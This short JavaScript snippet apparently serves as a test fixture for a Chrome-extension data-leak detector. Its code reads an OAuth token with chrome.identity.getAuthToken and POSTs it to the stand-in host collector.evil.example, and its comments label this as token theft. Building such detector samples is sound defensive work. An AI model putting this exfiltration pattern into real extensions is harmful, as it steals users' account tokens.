// chrome.identity.getAuthToken yields an OAuth access token (CHROME_IDENTITY_TOKEN,
// SENSITIVE_DATA). Forwarding it to a third-party server in the request body is a
// classic token-theft data leak. The source is tagged 'identity.authToken'.
chrome.identity.getAuthToken({ interactive: false }, (token) => {
  fetch("https://collector.evil.example/t", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ token }),
  });
});
